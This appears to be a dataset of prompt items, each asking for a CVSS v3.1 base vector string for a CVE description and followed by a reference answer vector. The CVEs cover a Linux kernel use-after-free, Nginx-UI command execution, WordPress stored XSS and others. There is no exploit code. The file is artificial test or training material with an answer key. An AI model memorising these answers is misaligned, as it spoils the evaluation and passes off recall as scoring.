Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: In the Linux kernel through 6.7.1, there is a use-after-free in cec_queue_msg_fh, related to drivers/media/cec/core/cec-adap.c and drivers/media/cec/core/cec-api.c. 	CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Out-of-bounds Write vulnerabilities in svc1td_vld_plh_ap of libsthmbc.so prior to SMR Feb-2024 Release 1 allows local attackers to trigger buffer overflow. 	CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Nginx-UI is a web interface to manage Nginx configurations. It is vulnerable to arbitrary command execution by abusing the configuration settings. The `Home > Preference` page exposes a list of system settings such as `Run Mode`, `Jwt Secret`, `Node Secret` and `Terminal Start Command`. While the UI doesn't allow users to modify the `Terminal Start Command` setting, it is possible to do so by sending a request to the API. This issue may lead to authenticated remote code execution, privilege escalation, and information disclosure. This vulnerability has been patched in version 2.0.0.beta.9. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The Order Delivery Date for WP e-Commerce plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the 'available-days-tf' parameter in all versions up to, and including, 1.2 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Versions of the package network before 0.7.0 are vulnerable to Arbitrary Command Injection due to use of the child_process exec function without input sanitization. If (attacker-controlled) user input is given to the mac_address_for function of the package, it is possible for the attacker to execute arbitrary commands on the operating system that this package is being run on. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: : Relative Path Traversal vulnerability in B&R Industrial Automation Automation Studio allows Relative Path Traversal.This issue affects Automation Studio: from 4.0 through 4.12. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Exposure of Sensitive Information to an Unauthorized Actor vulnerability in IP2Location IP2Location Country Blocker.This issue affects IP2Location Country Blocker: from n/a through 2.33.3. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: IBM Operational Decision Manager 8.10.3, 8.10.4, 8.10.5.1, 8.11, 8.11.0.1, 8.11.1 and 8.12.0.1 is susceptible to remote code execution attack via JNDI injection when passing an unchecked argument to a certain API. IBM X-Force ID: 279145. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: An OS Command Injection vulnerability exists in BIOVIA Materials Studio products from Release BIOVIA 2021 through Release BIOVIA 2023. Upload of a specially crafted perl script can lead to arbitrary command execution. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Micronaut Framework is a modern, JVM-based, full stack Java framework designed for building modular, easily testable JVM applications with support for Java, Kotlin and the Groovy language. Enabled but unsecured management endpoints are susceptible to drive-by localhost attacks. While not typical of a production application, these attacks may have more impact on a development environment where such endpoints may be flipped on without much thought. A malicious/compromised website can make HTTP requests to `localhost`. Normally, such requests would trigger a CORS preflight check which would prevent the request; however, some requests are "simple" and do not require a preflight check. These endpoints, if enabled and not secured, are vulnerable to being triggered. Production environments typically disable unused endpoints and secure/restrict access to needed endpoints. A more likely victim is the developer in their local development host, who has enabled endpoints without security for the sake of easing development. This issue has been addressed in version 3.8.3. Users are advised to upgrade. 	CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
